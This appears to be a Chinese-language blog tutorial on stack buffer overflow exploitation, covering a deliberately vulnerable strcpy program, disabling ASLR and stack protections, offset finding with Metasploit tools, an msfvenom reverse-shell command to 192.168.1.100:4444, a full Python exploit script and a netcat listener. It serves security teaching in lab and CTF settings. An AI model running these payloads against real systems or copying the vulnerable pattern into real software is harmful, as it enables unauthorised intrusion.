---
title: 漏洞利用开发：从缓冲区溢出到 shellcode 实战
slug: kali-漏洞利用开发-exploit-n3o4p
date: 2026-09-30
visibility: public
tags: Kali Linux, 漏洞利用, 缓冲区溢出, shellcode, 二进制安全, 教程
---

# 漏洞利用开发：从缓冲区溢出到 shellcode 实战

> 漏洞利用（Exploit Development）是渗透测试的"核心技术"，也是 CTF 与漏洞研究的必修课。本文从最经典的**缓冲区溢出**入手，带你理解内存攻击的本质，并写出第一个可利用的 Payload。

## 一、内存与栈：先搞懂基础

程序运行时内存布局：

```
高地址
+----------------+
| 栈（向下增长）   |  ← 局部变量、返回地址
+----------------+
| 堆（向上增长）   |  ← 动态分配
+----------------+
| 数据段 (.data)  |  ← 全局变量
+----------------+
| 代码段 (.text)  |  ← 机器指令
+----------------+
低地址
```

**栈帧结构**（x86 调用约定）：

```
[局部变量][...][返回地址][函数参数]
```

## 二、缓冲区溢出原理

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];          // 栈上 64 字节缓冲区
    strcpy(buffer, input);     // 危险！无边界检查
}

int main(int argc, char **argv) {
    vulnerable(argv[1]);       // 传入超长字符串
    return 0;
}
```

攻击原理：

```
输入超长字符串 → 溢出 buffer
→ 覆盖相邻的栈数据
→ 覆盖返回地址（EIP/RIP）
→ 程序跳转到攻击者控制的位置
```

## 三、实验环境：编译一个易受攻击的程序

```bash
# 关闭 ASLR（地址随机化）便于学习
sudo sysctl -w kernel.randomize_va_space=0

# 编译（关闭栈保护、非执行位，加调试信息）
gcc -fno-stack-protector -z execstack -no-pie -g -o vuln vuln.c
```

### 用 GDB 观察溢出

```bash
gdb ./vuln
(gdb) run AAAA...A（超长输入）
(gdb) info registers rip   # 观察 RIP 被覆盖
(gdb) x/20wx $rsp          # 查看栈内存
```

## 四、手工构造 Payload

```python
# 用 Python 生成 64 字节 'A'
python3 -c "print('A'*64)" | ./vuln
```

寻找偏移量（覆盖 RIP 的确切位置）：

```bash
# 生成特征字符串
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

# 崩溃后查偏移
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <查询值>
```

## 五、生成 shellcode

### 用 msfvenom 生成反弹 shell

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f python -b "\x00" --platform linux --arch x64
```

输出示例：

```python
buf = b""
buf += b"\x48\x31\xc9\x48\x81\xe9..."
```

### 完整利用脚本

```python
#!/usr/bin/env python3
import struct

offset = 72                       # 找到的偏移量
ret_addr = 0x7fffffffe100         # shellcode 地址（GDB 中确定）

shellcode = b"\x31\xc0\x50..."    # msfvenom 输出

payload = b"A" * offset
payload += struct.pack("<Q", ret_addr)  # 覆盖 RIP
payload += b"\x90" * 16                 # NOP sled
payload += shellcode

print(payload)
```

```
执行：./vuln $(python3 exploit.py)
监听：nc -lvnp 4444 → 获得 shell
```

## 六、现代防护机制（为什么现在难了）

| 防护 | 作用 | 绕过方式 |
|------|------|---------|
| NX/DEP | 栈不可执行 | ROP（重用现有代码） |
| ASLR | 地址随机化 | 信息泄露 + 爆破 |
| Stack Canary | 检测溢出 | 泄露 canary |
| PIE | 代码随机化 | 泄露基址 |
| RELRO | 防止 GOT 覆盖 | 部分绕过 |

> 所以现在的主流利用是 **ROP（Return-Oriented Programming）**——用程序里已有的 gadget 拼出恶意逻辑，而不是直接执行 shellcode。

## 七、学习路径

```
1. 熟悉汇编与内存（x86/64）
2. 用 Kali 自带靶机练习：Protostar、pwnable.kr
3. 学会用 gdb + pattern 工具
4. 做 10 个 CTF pwn 题（pwnable.tw）
5. 学习 ROP / ret2libc
6. 尝试真实 CVE（在授权的靶场）
```

## 安全合规

> 漏洞利用开发是安全研究的重要技能，但**任何利用行为必须在授权环境**（CTF、靶场、授权测试）中进行。非法利用他人系统属于刑事犯罪。

## 小结

- 栈溢出 = 覆盖返回地址 → 劫持控制流
- 偏移量计算是第一步，msfvenom 生成 shellcode 是常用路径
- 现代防御（NX/ASLR/canary）让利用难度大幅提升
- ROP 是当前主流技术，pwn 题是最好的练习场
- 合规红线：未经授权一律不做

> 下一篇：Active Directory 渗透——从枚举到域控接管。